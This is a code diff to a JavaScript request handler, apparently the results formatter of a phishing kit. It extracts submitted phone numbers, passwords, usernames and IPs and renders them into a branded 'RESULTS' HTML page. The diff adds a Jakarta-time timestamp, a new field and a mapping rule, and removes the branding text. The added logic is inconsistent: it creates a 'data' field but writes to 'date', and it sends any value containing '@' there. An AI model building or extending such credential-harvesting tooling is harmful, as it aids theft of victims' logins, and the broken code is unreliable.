@@ -33,7 +33,18 @@ function parseBody(req) {
     return {};
   }
 }
+const now = new Date();
 
+const date = now.toLocaleString("id-ID", {
+  timeZone: "Asia/Jakarta",
+  weekday: "long",
+  day: "numeric",
+  month: "long",
+  year: "numeric",
+  hour: "2-digit",
+  minute: "2-digit",
+  second: "2-digit"
+});
 /* ======================
    EXTRACTOR (TEXT + HTML)
 ====================== */
@@ -44,6 +55,8 @@ function extractVars(input = "") {
     phone: "-",
      password: "-",
     user: "-",
+     data: "-",
+     
     ip: "-"
     // password tidak disimpan demi keamanan
   };
@@ -104,6 +117,10 @@ function map(vars, key, value) {
     vars.login = v;
     return;
   }
+   if (k.includes("date") || v.includes("@")) {
+    vars.date = v;
+    return;
+   }
 
   if (k.includes("phone") || k.includes("hp") || k.includes("tel")) {
     vars.phone = v;
@@ -314,7 +331,7 @@ border-bottom:2px solid #e51b23;
 
 <img
 src="https://i.imgur.com/nC1LswY.png"
-alt="RESULTS JOEST27"
+alt=""
 width="550"
 style="
 display:block;
@@ -334,7 +351,6 @@ letter-spacing:6px;
 color:#b5b5b5;
 font-weight:bold;
 ">
-PREMIUM RESULT SYSTEM
 </div>
 
 <div style="
